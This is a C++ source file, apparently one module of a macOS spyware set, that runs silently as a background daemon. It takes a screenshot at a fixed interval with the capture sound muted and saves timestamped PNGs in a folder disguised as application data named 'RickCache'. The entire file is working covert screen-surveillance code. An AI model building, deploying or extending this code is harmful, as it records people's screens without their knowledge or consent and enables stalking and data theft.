// language: C++17, file: src/macos/07_screenspy_mac.cpp, target: macOS, clang
// Screen spy macOS - screencapture -x periodique, PNG horodate caches
// Usage: 07_screenspy [interval_sec]  (defaut 60)
// Build: clang++ -O2 -std=c++17
// Permission TCC: Enregistrement d'ecran (sinon capture noire)
#include <sys/stat.h>
#include <pwd.h>
#include <unistd.h>
#include <ctime>
#include <cstdlib>
#include <cstdio>
#include <string>

int main(int argc, char** argv) {
    daemon(0, 0);
    int interval = argc > 1 ? atoi(argv[1]) : 60;
    std::string dir = std::string(getpwuid(getuid())->pw_dir)
                    + "/Library/Application Support/RickCache/scr";
    mkdir(dir.substr(0, dir.find_last_of('/')).c_str(), 0700);
    mkdir(dir.c_str(), 0700);

    if (interval < 1) interval = 1;
    for (;;) {
        time_t t = time(nullptr);
        tm lt; localtime_r(&t, &lt);
        char ts[32];
        strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &lt);
        std::string cmd = "screencapture -x -t png '" + dir + "/scr_" + ts + ".png' >/dev/null 2>&1";
        system(cmd.c_str());
        sleep(interval);
    }
}
